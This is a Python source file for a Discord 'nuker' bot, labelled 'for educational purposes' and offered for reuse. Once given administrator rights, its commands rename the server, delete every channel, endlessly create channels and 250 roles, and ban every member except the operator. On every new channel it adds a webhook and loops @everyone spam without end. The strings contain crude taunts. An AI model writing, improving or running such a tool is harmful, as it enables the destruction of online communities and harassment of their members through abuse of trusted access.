"""
this is just for educational purposes !!!
also if youre gonna use this give creds
"""

import discord
from discord.ext import commands
import asyncio
import aiohttp # prob wont use this but just in case
from itertools import cycle
from colorama import Fore
import random

with open("C:/Users/Administrator/Downloads/voidsec.png", "rb") as file: # replace this with your own file path
  servicon = file.read()

penny = "token here real"

msgcum = ["@everyone yeah idk"]
# add , after " to add more messagess
channels = cycle(["nuked by nutdestroyer420", "gachas are scared", "property of nutdestroyer420"]) 
                                              # ^^ genuinely the cringest shit i had to ever type out but ehh
servname = "Romania" # real

rolename = channels

webhooknames = channels

prefix = "v!" # doesnt have to be a var but i prefer it like this

voidsec = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

@voidsec.event
async def on_ready():
    print(Fore.RED + f"""
██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║ ╚████╔╝ █████╗  ██████╔╝
██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║  ╚██╔╝  ██╔══╝  ██╔══██╗
██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
{Fore.YELLOW}[i] Destroyer: Ready to destroy some Gachas.
{Fore.YELLOW}[i] Username: {voidsec.user}
{Fore.YELLOW}[i] User ID: {voidsec.user.id}
{Fore.YELLOW}[i] Selfbot: False
{Fore.YELLOW}[i] Bot: True
{Fore.YELLOW}[i] Prefix: {prefix}
{Fore.YELLOW}[i] Creator: VoidSec
{Fore.YELLOW}[i] Help: Type v!help for a list of commands.
{Fore.YELLOW}[i] Invite URL: https://discord.com/oauth2/authorize?client_id={voidsec.user.id}&scope=bot&permissions=8
""")

async def delchans(ctx):
    void = ctx.guild
    for channel in void.channels:
        try:
           await channel.delete() # no community handling poop :scream: (im too lazy mb)
           print(f"{Fore.GREEN}[+] Channel deleted")
        except:
            print(f"{Fore.RED}[-] Channel not deleted")

async def createchans(ctx):
    void = ctx.guild
    while True:
      try:
         await void.create_text_channel(name=next(channels))
         print(f"{Fore.GREEN}[+] Channel created")
      except:
          print(f"{Fore.RED}[-] Channel not created")

async def croles(ctx):
    void = ctx.guild
    for i in range(250):
        try:
           await void.create_role(name=next(rolename))
           print(f"{Fore.GREEN}[+] Role created")
        except:
            print(f"{Fore.RED}[-] Role not created")

@voidsec.command()
async def nuke(ctx):
    void = ctx.guild
    await void.edit(name=servname, icon=servicon)
    await asyncio.gather(
        delchans(ctx),
        createchans(ctx),
        croles(ctx)
    )

@voidsec.command()
async def mban(ctx):
    void = ctx.guild
    for member in void.members:
        if member != ctx.author:
            try:
                await member.ban(reason=next(channels))
                print(f"{Fore.GREEN}[+] banned {member}")
            except:
                print(f"{Fore.RED}[-] {member} not banned")

@voidsec.event
async def on_guild_channel_create(channel):
    await channel.create_webhook(name="nutdestroyer420", avatar=servicon) 
    for webhook in await channel.webhooks():
        while True:
          await webhook.send(random.choice(msgcum))
          await channel.send(random.choice(msgcum))

voidsec.run(penny)
